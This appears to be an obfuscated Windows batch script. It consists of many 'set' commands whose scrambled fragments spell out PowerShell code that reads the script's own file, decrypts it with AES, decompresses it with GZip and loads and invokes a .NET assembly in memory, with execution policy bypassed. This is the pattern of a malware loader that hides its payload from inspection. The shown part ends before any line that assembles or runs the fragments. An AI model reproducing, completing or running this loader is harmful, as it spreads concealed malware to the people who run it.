@echo off
set "HIKCkdvDxb=Z.En"
set "VunkqtSfaO=tion"
set "fLDbDJPuPE=$HAg"
set "sJFZNIHGmk=]::("
set "fbjHEGmyyb=l5E7"
set "voGTYPxhOg=rity"
set "OBdErLjcna=YxVw"
set "pAzTrTMIEx=Obje"
set "XnJdSomQfw=tem."
set "iFDXucfwbo=g = "
set "HpdONJyCes=pose"
set "xFkKYOQcSA=rity"
set "fAYaNnUFrJ=] -j"
set "iuuxkHkCBf=1..-"
set "SRUXdhxqTT=am;$"
set "PITqcBioqG=se()"
set "nOxyFdHmWJ=[Sys"
set "dhYZvpLhqZ=e = "
set "xILTTkTbGS= New"
set "DHneDfOpLk=..-1"
set "FXZeOvkNIh=flec"
set "czpIyxpdRR=Obje"
set "QAyhVmLytA=ateD"
set "HAlQtKExNF=c = "
set "APxWUFUUOK=mXNm"
set "qCloBYGvbz=ispo"
set "gOFxcWjjfC=yste"
set "dgscFvxFNs=bstr"
set "JSpJVxRwLh=n ''"
set "vEDAhjqbVK=:: '"
set "VGLMiyqHSa=3); "
set "CZFcnoTvte=fneX"
set "lUOqGmdVXh=n ''"
set "GOhDRTuffi=urit"
set "ymmzKLsYYP=lit("
set "ZDVtwhIKVL=TllA"
set "WqjrOzKnkw=[Env"
set "DXOCfchxti=hRx "
set "sEsOzwcHdu=[]] "
set "gexjPoWhjJ== $N"
set "YafLiZQZKo=embl"
set "bSlTsAwQGi=y]::"
set "tiRnuemFnH=le  "
set "MQmcXXrJZi=]::C"
set "ohKZGUuQaZ=ewLi"
set "BzHHeuSQwa=pzka"
set "NFlOYtqpmy=File"
set "cBCYcvEQjc=rt]:"
set "ZVVBwBfgCe=cla "
set "ePMMeGHmCP=$HAg"
set "yKELmilDrV=m.IO"
set "UDcjlGldFw=y.Cr"
set "VoENDVVxSt= '')"
set "ErqoubPnFD=gth)"
set "srCkaLkTQi=.Dis"
set "skXQcvAuzU=tem."
set "RGouWqblSY=();$"
set "XQezKmFTbo=yste"
set "hweYCkoHop=16] "
set "rwZifOjQka=m.IO"
set "fcMIXbtGtv=.GZi"
set "iYCjsyURRm=RmAx"
set "sbHiXrFqDU=::('"
set "aWLBKSOcKr=1] -"
set "RfeQaBFcyr=ect "
set "kqZxCBaKza=$NmX"
set "BWKUEigDhu=vert"
set "CfctOCtsjM=oint"
set "cVXvAYOosO=stem"
set "uVsKRSMZkL=oArr"
set "siNQiVoBcq=oL'["
set "SfcHOqnsjk=ka);"
set "AfpJzleQhH=y.Ci"
set "fbfMdBFrOH=Invo"
set "DtUPbhwXSm=mXNm"
set "BYUoklvSUu=X = "
set "inIIDEqyMS=ptor"
set "qtxxGWxioa=ck($"
set "kYkeJmbYcR=)))"
set "aCSnrUsWij=stem"
set "FotwieCxlO=V = "
set "RQqFTkDNUR=nirt"
set "YIHFsAUcRv=oryS"
set "yqGEcfesVK=$CXG"
set "lRewPxJNhB=em.I"
set "EvyEvMskxw='')("
set "BjyfuKdyeT=bjec"
set "VTMrSZqqaH=();$"
set "IpHKPWKUJM=Ci, "
set "zzJoKvKozd=Star"
set "qHZtGnkJlG=morF"
set "vEwLcxuGTh=; };"
set "oplaFsDUSr=O.Me"
set "ysykJxSwtM=.-16"
set "kGRwrngNZx=tsWi"
set "USNkfLSKxS=);$y"
set "oonuusltgh='[-1"
set "bZissfIguR=ress"
set "ApVAEhkOoz=:('g"
set "oqZveacDbj=-ep "
set "rkcoZXWjCZ=Lc.D"
set "jhHOOOKKpy=-Obj"
set "TvBnaFeilI=HAgN"
set "rDgfenNtEG=grap"
set "ltBSdBlffm=();$"
set "PKaXBFpMnL=t Sy"
set "jMcEwCQXQl=fore"
set "wJrymxFhZB=Syst"
set "YvVGudkXqy=e]::"
set "juuSIQlLTc='txe"
set "CKMqMBITzy=.Key"
set "PtXTlhecOU=saBm"
set "eRvhUmlWfS=orF'"
set "TmvRNAtvcG=-4] "
set "sWTiJewwIR=Secu"
set "dJdQQdacAO=yTo("
set "SLEyXrmDdN=jCLc"
set "wmpMkZbUHv=CXGC"
set "CaDnCYRZii=yste"
set "oJKBUNuwzH=i = "
set "LVfeLlurdG=idiQ"
set "ZdXCQCHDON== [S"
set "WSVbtOuesy=SEV."
set "GqUJsbHWAO=sion"
set "xXAaMnfslr=tryP"
set "shNgwphude=);$N"
set "ChAqaRnksH=hI ="
set "wCcXQqwXeX=nage"
set "CTpRbYhYDq=th('"
set "RZAbixyOSR=;$xZ"
set "xjXqJJtUQB= '')"
set "CjsdHvjmKz=zuZI"
set "CQUFxGBewd=Mode"
set "CqPoBWCMcs=ress"
set "JcIDACJaXq=ct S"
set "VOfpPIxSdi=ypto"
set "SSzZSmFVup=d;$N"
set "FbWySZCYRn=, $H"
set "tOCsMrSVEJ='0Pg"
set "pGIQEWXDoy=Conv"
set "FsjlsujEjB=$POb"
set "vBGWUgnhsi=.Com"
set "RgalgTzlQV= [st"
set "MmWiGiIOIU=$PjC"
set "JfJmQjVuZJ=k; }"
set "cLMyDAMPSi=HAgN"
set "MgELxKsfRZ=X, 0"
set "jNLVNlKNNU=CFxo"
set "xZqMwUdycu='gni"
set "lZQXxnQPCC='[-1"
set "rWrVcMEcYM=s75K"
set "qVncJOBKst=ring"
set "zimdvvzSIp=rans"
set "fxGJJBXcIy=('da"
set "zpUgVGkSnL=  $C"
set "nLLjIFcqoi=fneX"
set "iQeiUjYlRC=comm"
set "UJiUpujuKU=106u"
set "EvdHOjqqVn=ew-O"
set "hAMJMGJaIj=form"
set "eDcnJHdDBJ=PTtG"
set "SLoEADpDjt=HAgN"
set "wZDscpFKGM=onve"
set "RMsPythXJU=gnir"
set "UJaWCXDGxc=m.Re"
set "eZYUCgxGkC=)) {"
set "lmcTZTcAYj= [Sy"
set "CCyVrrCLJC=('%~f0'"
set "NUzTeQHSQA=stem"
set "vJBIpMIdOi=ddin"
set "tRWhYtyjvv=mXNm"
set "ZJdAZumZbH=hRx."
set "JZtdUDcmYL=m.Pa"
set "kyTIWUnQpa=);$N"
set "lkxRofGWDT=eam("
set "DJjkUAedXo=hy.A"
set "ZlAthKcuEa=eMVs"
set "pyrDOHOwFI=L4Yi"
set "aQNoQCHzrF=[Sys"
set "DVIiFKIwps= [Sy"
set "tZvxknItoW=Fina"
set "BAOaQgKwFB=LScl"
set "bkxZaBGEgN=.Dis"
set "iRaSMcWbgA=pres"
set "TGXTgYYidb=gjYA"
set "IaqGfOnyYN=($LS"
set "zhpzJCXcYn=;$id"
set "ThFzUYXRpc===')"
set "eHAMYQHTsK=F'[-"
set "PwzFPuxWBz=BC;$"
set "PITWsKCKES=ose("
set "MHxgyPcwLl=[Sys"
set "TIWPjbgIOF=ress"
set "EkpXRQWyWZ=NX ="
set "uopWJOWize=pher"
set "fqaSMfSKpY=$ypz"
set "NPPNlrMHue=6esa"
set "KYbRqWbzok=ka.T"
set "IMSknFSlUD=raph"
set "jKOIGZBZNU=Nm.I"
set "iDLNmabIbD=Stre"
set "ErCWpZaAyw=ka ="
set "FlHwCJOQda=PObh"
set "KZxFNOzSIz=ecry"
set "nxuflQsoEO=I) {"
set "kzcgGIIEVz=New-"
set "KuZHzMPyHA=::De"
set "qxdytlnkEm=ose("
